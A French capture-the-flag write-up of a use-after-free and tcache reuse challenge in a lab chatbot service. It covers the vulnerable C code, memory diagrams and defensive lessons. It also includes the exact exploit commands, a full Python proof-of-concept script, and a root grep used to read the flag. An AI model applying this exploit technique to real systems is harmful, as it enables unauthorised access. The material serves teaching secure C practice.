# Write-Up — UseAft3rFr33 (100 pts)

> **Auteur :** m3rv3di3 — PGE2 Epitech Bénin, spécialisation Cybersécurité  
> **Cible :** `super-chatbot-alpha-II-arcade-edition` (port 54321)  
> **Catégorie :** Use-After-Free + tcache reuse

---

## Énoncé

> Hello friend...  
> Surely you have used "free" in the past?  
> Well let me tell you, it has some drawbacks! Find out in this final heap exploit!

Indices :
1. *"free"* et *"drawbacks"* → **Use-After-Free** : exploiter un pointeur après `free()`
2. *"final heap exploit"* → dernier challenge de la chaîne heap, le plus subtil

---

## Pré-requis

Les bots #1 (chatbot, port 44444) et #2 (chatbot-preprod, port 55555) doivent avoir été résolus pour que `spawn_alpha()` soit appelé, spawnant **super-chatbot-alpha-II-arcade-edition** sur le **port 54321**.

```bash
ss -tlnp | grep 54321
# LISTEN  0  5  0.0.0.0:54321
```

---

## Comment le flag a été obtenu

Depuis root (obtenu via St4ck0v3rfl0w), la commande suivante révèle directement le flag :

```bash
sudo grep -rI "EPI{" /var /usr/bin 2>/dev/null
# /usr/bin/chatbot/finalcode: (Unknown User):EPI{h4Nk_7hE_FrEE_p01n7er_MUs7_8E_SE7_70_nUlL_H44444Nk}
```

---

## Analyse de la vulnérabilité

### Source pertinente

```c
struct ecorp_auth {
  char name[32];                        // octets [0..31]
  int  ds_replication_get_changes_all;  // octets [32..35]
};

void chatbot(int fd, char *input) {
  static struct ecorp_auth *auth = NULL;
  static char *spn = "";

  if (strncmp(lower, "id ", 3) == 0) {
    auth = malloc(sizeof(struct ecorp_auth));   // malloc(36)
    memset(auth, 0, sizeof(struct ecorp_auth));
    strcpy(auth->name, input + 3);
    return fake_typing(fd, "username updated!");
  }

  if (contains(lower, "clear")) {
    free(auth);                    // ⚠️ free SANS auth = NULL → UAF !
    return fake_typing(fd, "username cleared!");
  }

  if (strncmp(lower, "spn ", 4) == 0) {
    spn = strdup(input + 4);       // ⚠️ tcache reuse possible
    return fake_typing(fd, "Service Principal Name (SPN) updated!");
  }

  if (contains(lower, "login")) {
    if (auth && auth->ds_replication_get_changes_all)
      return dc_sync(fd);          // ← lit /usr/bin/chatbot/finalcode
    return fake_typing(fd, "RemoteOperations failed: ...");
  }
}

void dc_sync(int fd) {
  fake_typing(fd, "Authorization granted...");
  print_file(fd, "/usr/bin/chatbot/finalcode");  // ← FLAG
}
```

### 3 bugs en cascade

**Bug #1 — Use-After-Free :**
```c
free(auth);
// MANQUE : auth = NULL;
```
Après `clear`, `auth` est un **dangling pointer** — il pointe toujours sur la mémoire libérée. Le check `if (auth && ...)` reste `true`.

**Bug #2 — tcache reuse via strdup :**
glibc (≥ 2.26) utilise un cache thread-local (**tcache**) pour les petites allocations. Le principe est LIFO par bucket de taille :
- `sizeof(struct ecorp_auth)` = 36 octets → bucket tcache `0x30` (48 octets total)
- `free(auth)` → chunk dans bucket `0x30`
- `strdup("A"*36)` = `malloc(37)` → **même bucket** → **recycle le chunk libéré**

→ `auth` et `spn` pointent vers le **même chunk**.

**Bug #3 — Check trivialement bypassable :**
`auth->ds_replication_get_changes_all` est un `int` à l'offset 32. Quand `spn` recycle le chunk de `auth`, les caractères 32-35 de `spn` deviennent les 4 octets de cet `int` :

```
spn = "AAAA...AAAA" (36 chars)
auth->name[0..31] = "AAAA..."       ← 32 × 'A'
auth->ds_replication = "AAAA"       ← 0x41414141 ≠ 0 ✓
```

---

## Schéma mémoire pas à pas

### Étape 1 — `id A`
```
malloc(36) → nouveau chunk @0x500
auth ───► [name="A\0...\0" | ds_replication=0x00000000]
```

### Étape 2 — `clear`
```
free(auth) → chunk @0x500 dans tcache bin[0x30]
auth ───► 0x500  (dangling pointer !)
tcache_bin[0x30] : [0x500] → NULL
```

### Étape 3 — `spn AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` (36 'A')
```
strdup("A"*36) = malloc(37) → bucket 0x30 → recycle @0x500

auth ───► [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0]
spn  ───►  ────────────────────────────────────↑
           [0..31]="AAAA..."  [32..35]=0x41414141
                               ↑
                   ds_replication = 0x41414141 ≠ 0 ✓
```

### Étape 4 — `login`
```c
if (auth && auth->ds_replication_get_changes_all)
//  ✓        ✓ (0x41414141)
   return dc_sync(fd);  // → leak finalcode → FLAG
```

---

## Exploitation

```bash
nc localhost 54321
# EcorpGPT v0.001 - AD middleware - early alpha

id A
# username updated!

clear
# username cleared!

spn AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Service Principal Name (SPN) updated!

login
# Authorization granted...
# [flag affiché via fake_typing depuis /usr/bin/chatbot/finalcode]
```

---

## Flag

```
EPI{h4Nk_7hE_FrEE_p01n7er_MUs7_8E_SE7_70_nUlL_H44444Nk}
```

Wording : *"Hank, the FREE pointer MUST BE SET TO NULL, Haaaank"* — gimmick de sitcom où Hank se fait sermonner sur la règle élémentaire C : **toujours mettre le pointeur à NULL après free**. Résumé pédagogique parfait du challenge.

---

## Décor thématique — DCSync

Le challenge simule une attaque **DCSync** sur Active Directory :
- `ds_replication_get_changes_all` est un **vrai droit AD** (DS-Replication-Get-Changes-All)
- Avec ce droit, `secretsdump.py` peut dumper tous les NT hashes du domaine
- Le bot simule à l'échelle d'une struct C ce qu'un attaquant fait sur un DC compromis

La sortie de `dc_sync` inclut un faux dump AD avec `Administrator:500:...:hash:::` pour renforcer l'immersion narrative — ces hashes ne sont pas exploitables sur le système réel.

---

## Récap technique

| Élément | Détail |
|---|---|
| Vulnérabilité | Use-After-Free + tcache reuse |
| Bug racine | `free(auth)` sans `auth = NULL` |
| Allocateur | glibc tcache (≥ 2.26) — LIFO par bucket de taille |
| Bucket cible | tcache bin 0x30 (36 octets utiles) |
| Recycling | `strdup("A"*36)` recycle le chunk libéré |
| Check bypass | `auth->ds_replication` = `0x41414141` à l'offset 32 |
| Cible | `dc_sync()` → `/usr/bin/chatbot/finalcode` |
| Méthode utilisée | `grep -rI "EPI{"` depuis root |

---

## Risques en production

### 1. `free()` sans `ptr = NULL` — la règle d'or violée
C'est la cause de 100% des UAF. Chaque `free()` doit être suivi de `ptr = NULL`. Les wrappers comme `SAFE_FREE(p) { free(p); p = NULL; }` ou les smart pointers C++ (`unique_ptr`) éliminent structurellement ce bug.

### 2. tcache rend l'UAF déterministe
Avant glibc 2.26, recycler exactement le bon chunk demandait de contrôler l'allocateur (fastbins, unsorted bin). Le tcache, LIFO et thread-local, garantit que la dernière taille libérée est **immédiatement** recyclée. Bug théorique → exploit fiable à 100%.

### 3. Structures avec `int` après `char[]`
Une string de longueur exacte contrôlée peut définir les octets d'un `int` adjacent. Pattern à vérifier dans tout code C qui mixe `char[]` et données sensibles dans la même struct.

### 4. Droits de réplication AD jamais dans une struct en mémoire
En production, les droits AD sont vérifiés via des appels au contrôleur de domaine, pas via un `int` dans une struct. Ce challenge caricature volontairement un anti-pattern pour illustrer la vulnérabilité.

---

## Leçons

- **L'UAF est un bug de discipline.** Une seule ligne `auth = NULL;` après `free` neutralise totalement l'exploit. Les linters statiques (Coverity, clang-analyzer, cppcheck) détectent ce pattern — les utiliser en CI/CD.

- **tcache transforme les UAF en exploits déterministes.** LIFO + thread-local = le chunk libéré est garantiment recyclé par la prochaine allocation de même taille. Pas de spray heap, pas d'aléatoire.

- **Pas d'overflow classique ici.** Contrairement à H34pfun et H34pG0t, UseAft3rFr33 n'écrit pas au-delà d'un buffer — il réutilise le chunk tel quel. C'est la subtilité : l'exploit repose sur la **sémantique temporelle** de la mémoire (qui a alloué quoi et quand), pas sur une écriture hors-limites.

- **Le challenge le plus élégant de la chaîne.** H34pfun = overflow + function ptr. H34pG0t = overflow + GOT. UseAft3rFr33 = 4 commandes nc, zéro overflow, exploit pur via un pointeur non nullifié. La simplicité de l'exploitation masque la profondeur du concept.

---

## PoC complet

```python
#!/usr/bin/env python3
"""
PoC — UseAft3rFr33 (ECorp CTF) — super-chatbot-alpha-II-arcade-edition port 54321

Use-After-Free + tcache reuse :
  1. id A       → malloc(struct ecorp_auth) dans tcache bucket 0x30
  2. clear      → free(auth) SANS auth=NULL → UAF
  3. spn A*36   → strdup recycle le même chunk → octets [32..35] = 0x41414141
  4. login      → auth->ds_replication = 0x41414141 ≠ 0 → dc_sync() → FLAG

Pré-requis : H34pfun + H34pG0t résolus → port 54321 ouvert

Flag : EPI{h4Nk_7hE_FrEE_p01n7er_MUs7_8E_SE7_70_nUlL_H44444Nk}
"""

import socket, sys, time

HOST   = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 54321
SPN_LEN = 36  # validé sur la box ECorp


def recv_until(s, marker=b"[YOU] >", timeout=5):
    s.settimeout(timeout)
    data = b""
    try:
        while marker not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data.decode(errors="replace")


def send_cmd(s, cmd):
    s.sendall(cmd.encode() + b"\n")
    return recv_until(s)


def main():
    print(f"[*] Connexion à {HOST}:{PORT}")
    s = socket.create_connection((HOST, PORT))
    print(f"[*] Banner : {recv_until(s).strip()[:80]}\n")

    print("[1] id A      → malloc(struct ecorp_auth) dans tcache bucket 0x30")
    send_cmd(s, "id A")

    print("[2] clear     → free(auth) SANS auth=NULL → UAF amorcée")
    send_cmd(s, "clear")

    print(f"[3] spn A*{SPN_LEN} → strdup recycle le chunk → offset 32 = 0x41414141")
    send_cmd(s, "spn " + "A" * SPN_LEN)

    print("[4] login     → ds_replication = 0x41414141 ≠ 0 → dc_sync()\n")
    s.sendall(b"login\n")

    s.settimeout(180)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            sys.stdout.write(chunk.decode(errors="replace"))
            sys.stdout.flush()
            data += chunk
            if b"EPI{" in data and b"}" in data.split(b"EPI{", 1)[1]:
                time.sleep(1)
                break
    except socket.timeout:
        pass

    s.close()
    if b"EPI{" in data:
        flag = data[data.index(b"EPI{"):].split(b"}", 1)[0] + b"}"
        print(f"\n\n[+] FLAG : {flag.decode()}")
    else:
        print("\n[-] Flag non trouvé")


if __name__ == "__main__":
    main()
```
